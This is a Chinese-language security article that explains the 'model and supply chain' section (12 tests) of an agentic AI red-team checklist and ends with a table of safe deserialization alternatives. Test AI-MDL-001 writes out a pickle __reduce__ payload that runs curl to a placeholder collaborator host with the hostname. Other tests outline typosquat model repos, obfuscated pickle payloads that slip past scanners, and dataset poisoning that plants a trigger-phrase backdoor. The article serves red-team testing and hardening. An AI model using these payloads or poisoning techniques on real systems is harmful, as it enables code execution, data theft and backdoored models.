---
title: Agentic AI 红队检查清单 —— 模型与供应链（Model &amp; Supply Chain
url: https://mp.weixin.qq.com/s/bs91mr512Eeq1kXhEpi3aA
source: Doonsec's feed
date: 2026-10-24
fetch_date: 2026-10-25T07:09:33.836610
---

# Agentic AI 红队检查清单 —— 模型与供应链（Model &amp; Supply Chain

# Agentic AI 红队检查清单 —— 模型与供应链（Model & Supply Chain

原创

APT-101
APT-101

APT-101

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

![](https://mmbiz.qpic.cn/mmbiz_png/PIWj1VguNosscYoZk8Ep3icoNFMG6k9f5RMO6R0LT2OiaGict7Lic3Y4q2iaxuNeDF35SqubKzibibkdBHib64NWyGd2KtXZgBxXzzBJD1gcuFMkiclI/640?wx_fmt=png&from=appmsg)

> **来源**：《An agentic AI red team checklist: 222 tests, WSTG-style》，Ravi Rajput，infosecravi.com，2026-10-08。 全表 222 项测试 / 20 个类别；本文件为**第 4 类「模型与供应链」共 12 项**（AI-MDL-001 ~ AI-MDL-012）。 **风险等级分布**：严重 4 项 / 高 8 项 / 无中低项。 **检测方式分布**：带外 4 项 / 反射型 4 项 / 反射｜带外 3 项 / 盲测型 1 项 —— **12 项中有 7 项需要带外证据**，是已解读的 4 类里对 OOB 依赖最高的一类。**术语约定**：`<COLLAB>` 为带外监听地址；`ROLE`、`FN`、`NAME` 为占位符。 **保留英文**：测试编号、框架编号、MITRE ATLAS 编号、库与工具名（fickling、modelscan、safetensors、joblib…）、命令与参数，均按原表保留英文。

---

## 这一类的定位

前 3 类打的是**基础设施**和**身份**；这一类打的是"你信任的制品"这道边界。它的共同前提是一句话：

> **模型文件不是数据，是可执行的。**

`torch.load`、`pickle.load`、`joblib.load`、`yaml.load`、`from_pretrained(trust_remote_code=True)`、`torch.hub.load` —— 这些 API 在"加载"的语义下实际执行了反序列化或任意 Python 代码。作者在文章里把 `AI-MDL-001`（pickle 反序列化 RCE on the weight load path）与 IMDS 凭据窃取并列，作为 75 个严重项的典型。

本类可拆成三条链：

* **反序列化执行链（取得代码执行）**：`001` torch.load/pickle → `003` weights\_only=False / yaml.load / joblib.load → `002` trust\_remote\_code → `011` torch.hub / Lambda 层。**这四个是入口，不是"发现"。**
* **制品投毒链（污染下游）**：`004` 可变的 `latest` 标签 → `005` typosquat 仿冒仓库 → `007` 模型仓库写权限 → `008` 数据集投毒 / 标签翻转。004/005/007 属于 ATLAS `初始访问`，008 属于 `ML 攻击准备`。
* **检测闸门缺口链（让上面两条链不被拦住）**：`006` safetensors 未强制 → `010` 扫描器覆盖缺口。这两项本身不产生危害，但**它们决定了恶意制品能不能进得来**。

`012`（无限次推理窃取模型）独立成链，属于 ATLAS `ML 模型访问`——不打系统，打的是模型本身的商业价值。

---

## 一览

| 测试编号 | 测试名称 | 风险等级 | 检测方式 | 框架映射 |
| --- | --- | --- | --- | --- |
| AI-MDL-001 | torch.load / pickle 反序列化 RCE | **严重** | 反射型｜带外 | LLM03 供应链；ASI05 意外代码执行 |
| AI-MDL-002 | HF from\_pretrained 中的 trust\_remote\_code=True | **严重** | 带外 | LLM03 供应链；ASI05 意外代码执行 |
| AI-MDL-003 | weights\_only=False / 不安全的 yaml.load / joblib.load | **严重** | 带外 | LLM03 供应链；ASI05 意外代码执行 |
| AI-MDL-004 | 未锁定版本的模型权重（可变的 latest）/ 镜像仓库投毒 | 高 | 反射型 | LLM03 供应链；ASI04 Agentic 供应链 |
| AI-MDL-005 | 仿冒名称（typosquat）/ 恶意 Hugging Face 仓库（投毒权重或代码） | 高 | 带外 | LLM03 供应链；ASI04 Agentic 供应链 |
| AI-MDL-006 | safetensors 强制校验检查（缺失即视为问题） | 高 | 反射型 | LLM03 供应链 |
| AI-MDL-007 | 模型仓库写权限用于注册恶意模型 | **严重** | 反射型｜带外 | LLM03 供应链；ML06:2023；ASI04 Agentic 供应链 |
| AI-MDL-008 | 数据集投毒 / 标签翻转（训练 + 微调） | 高 | 盲测型 | LLM04 数据与模型投毒；ASI06 记忆与上下文投毒 |
| AI-MDL-009 | ML 流水线中的依赖/包供应链（pip-audit） | 高 | 反射型 | LLM03 供应链；ASI04 Agentic 供应链 |
| AI-MDL-010 | 模型文件扫描覆盖缺口（picklescan/modelscan） | 高 | 反射型｜带外 | LLM03 供应链 |
| AI-MDL-011 | 恶意 Lambda / PyTorch hub 仓库 | 高 | 带外 | LLM03 供应链；ASI05 意外代码执行 |
| AI-MDL-012 | 通过无限次推理窃取/提取模型 | 高 | 反射型 | ML06:2023 |

---

## 12 项明细

### AI-MDL-001

**测试编号**：AI-MDL-001

**测试类别**：模型与供应链

**测试名称**：torch.load / pickle 反序列化 RCE

**风险等级**：严重

**测试方法**

1. 构造一个检查点，其类的 `__reduce__` 返回 `os.system('curl http://<COLLAB>/$(hostname)')`。
2. 使用 fickling --check-safety 与 python -m fickling 对其进行扫描。
3. 在目标运行时中加载并观察回调。

```
fickling --check-safety model.pklpython -m fickling model.pkl# 加载侧：python -c "import torch; torch.load('model.pkl')"  后观察 <COLLAB> 回调# 工具：modelscan / torch / Burp Collaborator / interactsh
```

**预期结果**

fickling 报告出 os.system/exec 操作码，且加载该文件会触发带外回调，证明可从该制品实现代码执行。

---

### AI-MDL-002

**测试编号**：AI-MDL-002

**测试类别**：模型与供应链

**测试名称**：HF from\_pretrained 中的 trust\_remote\_code=True

**风险等级**：严重

**测试方法**

1. 在代码库中 grep 查找 trust\_remote\_code=True。
2. 加载一个其 modeling/config 模块中含 os.system 信标的仓库。
3. 观察加载时的代码执行。

```
grep -RIn "trust_remote_code=True" .# python: 用 huggingface_hub / transformers 加载含信标的仓库，观察 interactsh 回调
```

**预期结果**

仓库 modeling/config 模块中随附的 Python 代码在加载期间运行并触发回调，证明存在远程代码执行。

---

### AI-MDL-003

**测试编号**：AI-MDL-003

**测试类别**：模型与供应链

**测试名称**：weights\_only=False / 不安全的 yaml.load / joblib.load

**风险等级**：严重

**测试方法**

1. grep 查找 weights\_only=False、yaml.load 与 joblib.load。
2. 为每个汇聚点构造恶意载荷。
3. 触发加载并观察执行。

```
grep -RInE "weights_only\s*=\s*False|yaml\.load\(|joblib\.load\(" .fickling <payload># 触发侧：python 加载构造对象，观察 interactsh 回调（PyYAML / joblib）
```

**预期结果**

加载构造的对象会触发带外回调，确认每个不安全的汇聚点均存在反序列化 RCE。

---

### AI-MDL-004

**测试编号**：AI-MDL-004

**测试类别**：模型与供应链

**测试名称**：未锁定版本的模型权重（可变的 latest）/ 镜像仓库投毒

**风险等级**：高

**测试方法**

1. 检查部署配置与拉取清单中的 latest/可变标签。
2. 测试对仓库或模型 URI 的写权限。
3. 替换为带无害标记的权重文件并确认服务路径会加载它。

```
pip freeze# docker / registry CLI：检查镜像标签是否为 latest 或可变 tagcurl <MLflow API 地址># 替换制品后做 file hash comparison 确认生产环境确实加载了替换件
```

**预期结果**

生产环境逐字节地提供被替换的制品，证明该可变引用可被投毒。

---

### AI-MDL-005

**测试编号**：AI-MDL-005

**测试类别**：模型与供应链

**测试名称**：仿冒名称（typosquat）/ 恶意 Hugging Face 仓库（投毒权重或代码）

**风险等级**：高

**测试方法**

1. 枚举模型/包名称，识别相近的 typosquat 候选名。
2. 发布或托管一个含恶意建模代码或权重的 typosquat 仓库。
3. 观察解析器拉取并执行该制品。

```
huggingface_hub CLI   # 枚举/发布仓库pip index             # 核对包名解析grep -RIn "requirements" .fickling <payload># 观察 interactsh 回调
```

**预期结果**

该 typosquat 制品被拉取且其载荷被执行，从构建/运行时环境触发回调。

---

### AI-MDL-006

**测试编号**：AI-MDL-006

**测试类别**：模型与供应链

**测试名称**：safetensors 强制校验检查（缺失即视为问题）

**风险等级**：高

**测试方法**

1. 清点模型文件及其序列化格式。
2. 检查加载器/CI 是否存在 safetensors 白名单。
3. 确认 pickle 格式的检查点可被加载而不被拒绝。

```
find . -name "*.bin" -o -name "*.pkl" -o -name "*.pt" | xargs filefickling --check-safety <ckpt>modelscan <ckpt>grep -RIn "safetensors" .
```

**预期结果**

pickle 格式的权重文件在无 safetensors 强制要求的情况下成功加载，确认存在控制缺失。

---

### AI-MDL-007

**测试编号**：AI-MDL-007

**测试类别**：模型与供应链

**测试名称**：模型仓库写权限用于注册恶意模型

**风险等级**：严重

**测试方法**

1. 枚举仓库端点（MLflow、Hugging Face、内部）。
2. 测试未认证的创建/注册操作。
3. 注册一个恶意制品并确认服务 Pod 会拉取它。

```
curl <MLflow / HF / 内部仓库端点>nuclei -tags mlflow,jupyter,ray,kubeflow# 注册后确认服务端拉取，观察 interactsh 回调
```

**预期结果**

恶意模型在未授权的情况下被注册并被服务端拉取，触发回调或对外提供投毒制品。

---

### AI-MDL-008

**测试编号**：AI-MDL-008

**测试类别**：模型与供应链

**测试名称**：数据集投毒 / 标签翻转（训练 + 微调）

**风险等级**：高

**测试方法**

1. 定位数据集摄入或微调路径。
2. 向少量样本中注入触发/标签翻转行。
3. 在生产中训练并触发该后门，测量行为差异。

```
python <投毒/评估脚本>aws s3 cp <注入样本> <数据集路径># dataset tooling + 自建 eval harness 测量投毒前后的确定性差异
```

**预期结果**

训练后，该稀有触发短语可确定性地翻转模型输出，证明存在持久化后门。

---

### AI-MDL-009

**测试编号**：AI-MDL-009

**测试类别**：模型与供应链

**测试名称**：ML 流水线中的依赖/包供应链（pip-audit）

**风险等级**：高

**测试方法**

1. 枚举锁文件/依赖树（pip freeze、requirements.txt）。
2. 运行 pip-audit 与 npm audit。
3. 标记未锁定版本或已知有漏洞的包版本。

```
pip freezepip-auditnpm auditgrep -RIn "requirements" .
```

**预期结果**

报告出已知有漏洞或未锁定版本的依赖，对应可被利用的供应链暴露面。

---

### AI-MDL-010

**测试编号**：AI-MDL-010

**测试类别**：模型与供应链

**测试名称**：模型文件扫描覆盖缺口（picklescan/modelscan）

**风险等级**：高

**测试方法**

1. 清点扫描器配置与 CI 闸门。
2. 提交一个旨在规避检测的混淆或多跳 pickle 载荷。
3. 确认其通过扫描但在加载时仍会执行。

```
picklescan <payload>modelscan <payload>fickling <payload># 载荷通过扫描后触发加载，观察 interactsh 回调
```

**预期结果**

该载荷未被扫描器标记却仍能执行，证明存在检测覆盖缺口。

---

### AI-MDL-011

**测试编号**：AI-MDL-011

**测试类别**：模型与供应链

**测试名称**：恶意 Lambda / PyTorch hub 仓库

**风险等级**：高

**测试方法**

1. 定位 hub 或 Lambda 层的拉取路径。
2. 托管一个在 `__init__` 或安装钩子中包含代码的恶意仓库/层。
3. 加载它并观察执行。

```
python -c "import torch; torch.hub.load('<repo>', '<model>')"aws cli            # 检查/更新 Lambda 层fickling <artifact># 观察 interactsh 回调
```

**预期结果**

内嵌于恶意 hub 仓库或 Lambda 层中的代码在加载时执行并触发回调。

---

### AI-MDL-012

**测试编号**：AI-MDL-012

**测试类别**：模型与供应链

**测试名称**：通过无限次推理窃取/提取模型

**风险等级**：高

**测试方法**

1. 测试推理端点的速率限制与认证。
2. 进行高频查询以还原决策边界。
3. 确认替代模型可复现该模型的行为。

```
curl <推理端点># python 高频查询 + 自建 extraction scripts 训练替代模型（distillation）
```

**预期结果**

无界查询可复现目标模型的行为/决策边界，证明实现了模型提取。

---

## 反序列化汇聚点 → 安全替代对照

本类 10 项映射 `LLM03 供应链`，根因集中在几个 API 上。下表是**修复侧**的对应关系（红队用来判定"该不该报"，蓝队用来修）：

| 危险汇聚点 | 实际行为 | 安全替代 |
| --- | --- | --- |
| `torch.load(ckpt)` | 默认走 pickle，可执行任意代码 | `torch.load(..., weights_only=True)` 或改用 safetensors |
| `torch.load(..., weights_only=False)` | **显式关闭** 了新版保护 | 直接删掉该参数 |
| `pickle.load` / `joblib.load` | 任意对象构造 → RCE | 权重复盘换 safetensors；其余换 JSON/CSV |
| `yaml.load(f)` | 可构造任意 Python 对象 | `yaml.safe_load(f)` |
| `from_pretrained(..., trust_remote_code=True)` | 下载并**执行**仓库内 Python | 审核后本地化 vendoring；或 `trust_remote_code=False` |
| `torch.hub.load('<repo>', ...)` | 克隆并执行仓库代码 | 固定 commit hash + 本地 vendor |
| 镜像/Lambda 层用 `latest` 或可变 tag | 制品不可...